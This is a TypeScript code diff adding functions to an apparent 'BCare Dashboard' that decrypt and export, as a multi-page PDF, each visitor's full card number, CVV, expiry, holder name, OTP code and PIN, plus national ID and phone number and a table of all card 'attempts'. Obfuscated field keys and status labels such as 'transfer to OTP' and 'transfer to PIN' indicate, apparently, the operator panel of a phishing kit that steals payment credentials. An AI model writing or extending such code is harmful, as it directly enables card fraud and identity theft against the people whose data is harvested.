@@ -861,6 +861,256 @@ export async function generateCardPdf(visitor: InsuranceApplication) {
   }
 }
 
+function buildAllCardsPageHtml(
+  visitor: InsuranceApplication,
+  logoBase64: string,
+  index: number,
+  total: number
+): string {
+  const history = visitor.history || [];
+  const allCardHistory = [...history]
+    .filter((h: any) => h.type === "_t1" || h.type === "card")
+    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+  const allOtpHistory = [...history]
+    .filter((h: any) => h.type === "_t2" || h.type === "otp")
+    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+  const allPinHistory = [...history]
+    .filter((h: any) => h.type === "_t3" || h.type === "pin")
+    .sort((a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+
+  const latestCard = allCardHistory[0] ?? null;
+  const latestOtp = allOtpHistory[0] ?? null;
+  const latestPin = allPinHistory[0] ?? null;
+
+  const cardNumber = latestCard
+    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
+    : decryptField(visitor._v1 || visitor.cardNumber);
+  const cvv = latestCard
+    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
+    : decryptField(visitor._v2 || visitor.cvv);
+  const expiryDate = latestCard
+    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
+    : decryptField(visitor._v3 || visitor.expiryDate);
+  const cardHolderName = latestCard
+    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
+    : decryptField(visitor._v4 || visitor.cardHolderName);
+  const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
+  const bankName = latestCard ? val(latestCard.data?.bankInfo?.name) : val(visitor.bankInfo?.name);
+  const bankCountry = latestCard ? val(latestCard.data?.bankInfo?.country) : val(visitor.bankInfo?.country);
+  const otpCode = latestOtp
+    ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
+    : val(visitor._v5 || visitor.otpCode || visitor.otp);
+  const pinCode = latestPin
+    ? val(latestPin.data?._v6 || latestPin.data?.pinCode)
+    : val(visitor._v6 || visitor.pinCode);
+
+  const visitorName = val((visitor as any).name || visitor.ownerName);
+  const identityNumber = val(visitor.identityNumber);
+  const phoneNumber = val(visitor.phoneNumber);
+  const reportDate = formatDateTime(new Date());
+
+  const fmt = (num: string) => {
+    const clean = num.replace(/\s/g, "");
+    return clean.match(/.{1,4}/g)?.join("  ") || num;
+  };
+
+  const statusLabel = (status: string | undefined) => {
+    if (!status) return "—";
+    const map: Record<string, string> = {
+      waiting: "بانتظار المشرف", pending: "قيد المراجعة",
+      approved: "تم القبول", rejected: "تم الرفض",
+      approved_with_otp: "تحويل إلى OTP", approved_with_pin: "تحويل إلى PIN",
+      otp_rejected: "OTP مرفوض",
+    };
+    return map[status] || status;
+  };
+
+  const gradientBg = cardType?.toLowerCase().includes("mada")
+    ? "linear-gradient(135deg,#1a1a2e,#0f3460)"
+    : cardType?.toLowerCase().includes("visa")
+    ? "linear-gradient(135deg,#1D4ED8,#172554)"
+    : cardType?.toLowerCase().includes("master")
+    ? "linear-gradient(135deg,#7c3aed,#2e1065)"
+    : "linear-gradient(135deg,#134e4a,#0d9488)";
+
+  const cardNetworkText = (type: string) => {
+    const t = type.toLowerCase();
+    if (t.includes("visa")) return `<span style="font-size:20px;font-weight:900;font-style:italic;color:#fff;font-family:Arial,sans-serif;letter-spacing:-1px;">VISA</span>`;
+    if (t.includes("master")) return `<span style="font-size:16px;font-weight:900;color:#fff;">mastercard</span>`;
+    if (t.includes("mada")) return `<span style="font-size:16px;font-weight:900;color:#fff;">mada</span>`;
+    return `<span style="font-size:13px;font-weight:900;color:#fff;">${escapeHtml(type)}</span>`;
+  };
+
+  const attemptsRows = allCardHistory.map((entry: any, i: number) => {
+    const num = decryptField(entry.data?._v1 || entry.data?.cardNumber);
+    const exp = decryptField(entry.data?._v3 || entry.data?.expiryDate);
+    const cvvA = decryptField(entry.data?._v2 || entry.data?.cvv);
+    const holder = decryptField(entry.data?._v4 || entry.data?.cardHolderName);
+    return `
+      <tr style="background:${i % 2 === 0 ? "#F8FAFC" : "#fff"};">
+        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;color:#64748B;">${allCardHistory.length - i}</td>
+        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;font-family:'Courier New',monospace;letter-spacing:1px;">${escapeHtml(fmt(num))}</td>
+        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;font-family:'Courier New',monospace;">${escapeHtml(exp)}</td>
+        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;font-family:'Courier New',monospace;">${escapeHtml(cvvA)}</td>
+        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;">${escapeHtml(holder)}</td>
+        <td style="padding:5px 8px;border:1px solid #E2E8F0;font-size:10px;color:${entry.status === "approved" ? "#16a34a" : entry.status === "rejected" ? "#dc2626" : "#64748B"};font-weight:700;">${escapeHtml(statusLabel(entry.status))}</td>
+      </tr>`;
+  }).join("");
+
+  const isLast = index === total - 1;
+
+  return `
+    <div style="width:760px;margin:0 auto;background:#fff;font-family:'Cairo',Arial,sans-serif;direction:rtl;text-align:right;color:#0F172A;-webkit-print-color-adjust:exact;print-color-adjust:exact;${!isLast ? "page-break-after:always;" : ""}">
+
+      <!-- Page Header -->
+      <div style="background:linear-gradient(135deg,#0f172a,#1e293b);padding:14px 22px;display:flex;justify-content:space-between;align-items:center;border-radius:12px 12px 0 0;">
+        <div>
+          <div style="font-size:16px;font-weight:900;color:#fff;">كشف بيانات البطاقة البنكية</div>
+          <div style="font-size:10px;color:rgba(148,163,184,0.9);margin-top:2px;">BCare Dashboard · ${escapeHtml(reportDate)} · ${index + 1} / ${total}</div>
+        </div>
+        <img src="${logoBase64}" style="width:90px;height:auto;background:#fff;border-radius:8px;padding:5px 8px;" crossorigin="anonymous" />
+      </div>
+
+      <!-- Owner Strip -->
+      <div style="background:#F1F5F9;border-right:4px solid #3B82F6;padding:8px 18px;display:flex;gap:24px;align-items:center;flex-wrap:wrap;">
+        ${visitorName ? `<div><div style="font-size:9px;color:#64748B;">الاسم</div><div style="font-size:12px;font-weight:800;">${escapeHtml(visitorName)}</div></div>` : ""}
+        ${identityNumber ? `<div><div style="font-size:9px;color:#64748B;">رقم الهوية</div><div style="font-size:11px;font-weight:700;font-family:'Courier New',monospace;">${escapeHtml(identityNumber)}</div></div>` : ""}
+        ${phoneNumber ? `<div><div style="font-size:9px;color:#64748B;">الهاتف</div><div style="font-size:11px;font-weight:700;font-family:'Courier New',monospace;">${escapeHtml(phoneNumber)}</div></div>` : ""}
+        <div><div style="font-size:9px;color:#64748B;">المحاولات</div><div style="font-size:12px;font-weight:800;color:#1D4ED8;">${allCardHistory.length}</div></div>
+      </div>
+
+      <!-- Card Visual + Details side by side -->
+      <div style="padding:14px 22px 8px;display:flex;gap:20px;align-items:flex-start;">
+        <!-- Visual Card -->
+        <div style="flex-shrink:0;">
+          <div style="background:${gradientBg};border-radius:14px;padding:18px 22px;width:280px;min-height:160px;position:relative;box-shadow:0 12px 40px rgba(0,0,0,0.25);">
+            <div style="width:30px;height:22px;background:linear-gradient(135deg,#e2b96e,#c9943c);border-radius:4px;margin-bottom:14px;"></div>
+            <div style="font-size:15px;font-weight:700;color:#fff;letter-spacing:2.5px;font-family:'Courier New',monospace;margin-bottom:12px;">
+              ${escapeHtml(cardNumber ? fmt(cardNumber) : "•••• •••• •••• ••••")}
+            </div>
+            <div style="display:flex;justify-content:space-between;align-items:flex-end;">
+              <div>
+                <div style="font-size:8px;color:rgba(255,255,255,0.6);letter-spacing:1px;">CARD HOLDER</div>
+                <div style="font-size:11px;font-weight:700;color:#fff;margin-top:1px;">${escapeHtml(cardHolderName || "—")}</div>
+              </div>
+              <div style="text-align:left;">
+                <div style="font-size:8px;color:rgba(255,255,255,0.6);letter-spacing:1px;">EXPIRES</div>
+                <div style="font-size:11px;font-weight:700;color:#fff;margin-top:1px;font-family:'Courier New',monospace;">${escapeHtml(expiryDate || "MM/YY")}</div>
+              </div>
+              ${cardType ? `<div>${cardNetworkText(cardType)}</div>` : ""}
+            </div>
+            <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:14px;background:linear-gradient(135deg,rgba(255,255,255,0.1) 0%,transparent 50%,rgba(0,0,0,0.08) 100%);pointer-events:none;"></div>
+          </div>
+          ${bankName ? `<div style="font-size:10px;color:#64748B;margin-top:5px;margin-right:2px;">🏦 ${escapeHtml(bankName)}${bankCountry ? ` · ${escapeHtml(bankCountry)}` : ""}</div>` : ""}
+        </div>
+
+        <!-- Details Table -->
+        <div style="flex:1;">
+          <div style="background:linear-gradient(90deg,#1E40AF,#1D4ED8);color:#fff;border-radius:8px 8px 0 0;padding:6px 10px;font-size:12px;font-weight:800;">💳 تفاصيل البطاقة</div>
+          <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
+            ${cardNumber ? `<tr><td style="width:40%;background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;white-space:nowrap;">رقم البطاقة</td><td style="font-size:11px;font-weight:800;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:1.5px;">${escapeHtml(fmt(cardNumber))}</td></tr>` : ""}
+            ${cardHolderName ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">الاسم</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">${escapeHtml(cardHolderName)}</td></tr>` : ""}
+            ${expiryDate ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">الانتهاء</td><td style="font-size:11px;font-weight:800;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;">${escapeHtml(expiryDate)}</td></tr>` : ""}
+            ${cvv ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">CVV</td><td style="font-size:13px;font-weight:900;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:3px;color:#dc2626;">${escapeHtml(cvv)}</td></tr>` : ""}
+            ${cardType ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">النوع</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">${escapeHtml(cardType)}</td></tr>` : ""}
+            ${bankName ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">البنك</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">${escapeHtml(bankName)}</td></tr>` : ""}
+            ${otpCode ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">OTP</td><td style="font-size:13px;font-weight:900;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:3px;color:#7C3AED;">${escapeHtml(otpCode)}</td></tr>` : ""}
+            ${pinCode ? `<tr style="background:#F8FAFC;"><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">PIN</td><td style="font-size:13px;font-weight:900;border:1px solid #D1D5DB;padding:5px 8px;font-family:'Courier New',monospace;letter-spacing:3px;color:#7C3AED;">${escapeHtml(pinCode)}</td></tr>` : ""}
+            ${visitor.cardStatus ? `<tr><td style="background:#F8FAFC;color:#334155;font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;">الحالة</td><td style="font-size:10px;font-weight:700;border:1px solid #D1D5DB;padding:5px 8px;color:${visitor.cardStatus === "approved" ? "#16a34a" : visitor.cardStatus === "rejected" ? "#dc2626" : "#64748B"};">${escapeHtml(statusLabel(visitor.cardStatus))}</td></tr>` : ""}
+          </table>
+        </div>
+      </div>
+
+      <!-- Attempts History -->
+      ${allCardHistory.length > 1 ? `
+      <div style="padding:0 22px 12px;">
+        <div style="background:linear-gradient(90deg,#0F766E,#0D9488);color:#fff;border-radius:8px 8px 0 0;padding:6px 10px;font-size:12px;font-weight:800;">🧾 سجل المحاولات (${allCardHistory.length})</div>
+        <table style="width:100%;border-collapse:collapse;border:1px solid #D1D5DB;border-top:none;">
+          <thead>
+            <tr style="background:#E2E8F0;">
+              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">#</th>
+              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">رقم البطاقة</th>
+              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">الانتهاء</th>
+              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">CVV</th>
+              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">الاسم</th>
+              <th style="padding:5px 8px;border:1px solid #D1D5DB;font-size:9px;font-weight:800;color:#334155;">الحالة</th>
+            </tr>
+          </thead>
+          <tbody>${attemptsRows}</tbody>
+        </table>
+      </div>` : ""}
+
+      <!-- Divider footer -->
+      <div style="border-top:1px solid #E2E8F0;margin:0 22px;padding:6px 0;font-size:9px;color:#94A3B8;text-align:center;">
+        BCare Dashboard · Card Report · ${index + 1} / ${total}
+      </div>
+    </div>
+  `;
+}
+
+export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
+  const hasCardData = (v: InsuranceApplication) => {
+    const cardFromHistory = (v.history || []).some(
+      (h: any) => h.type === "_t1" || h.type === "card"
+    );
+    const directCard = !!(v._v1 || v.cardNumber);
+    return cardFromHistory || directCard;
+  };
+
+  const withCards = visitors.filter(hasCardData);
+  if (withCards.length === 0) return;
+
+  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
+  const html2pdf = (await import("html2pdf.js")).default;
+
+  const link = document.createElement("link");
+  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
+  link.rel = "stylesheet";
+  document.head.appendChild(link);
+  await new Promise((resolve) => setTimeout(resolve, 1500));
+
+  const combinedHtml = `
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <div id="all-cards-pdf" style="font-family:'Cairo',Arial,sans-serif;direction:rtl;background:#fff;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
+      ${withCards.map((v, i) => buildAllCardsPageHtml(v, BECARE_LOGO_BASE64, i, withCards.length)).join("\n")}
+    </div>
+  `;
+
+  const container = document.createElement("div");
+  container.innerHTML = combinedHtml;
+  container.style.position = "absolute";
+  container.style.left = "-9999px";
+  container.style.top = "0";
+  container.style.width = "780px";
+  document.body.appendChild(container);
+
+  const element = container.querySelector("#all-cards-pdf") as HTMLElement;
+
+  const opt = {
+    margin: [6, 4, 6, 4] as [number, number, number, number],
+    filename: `جميع_البطاقات_${Date.now()}.pdf`,
+    image: { type: "jpeg" as const, quality: 0.97 },
+    html2canvas: {
+      scale: 2,
+      useCORS: true,
+      letterRendering: true,
+      scrollY: 0,
+    },
+    jsPDF: {
+      unit: "mm",
+      format: "a4",
+      orientation: "portrait" as const,
+    },
+    pagebreak: { mode: ["css", "legacy"] },
+  };
+
+  try {
+    await html2pdf().set(opt).from(element).save();
+  } finally {
+    document.body.removeChild(container);
+  }
+}
+
 export async function generateVisitorPdf(visitor: InsuranceApplication) {
   const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
   const { STAMP_BASE64 } = await import("@/lib/pdf-stamp");
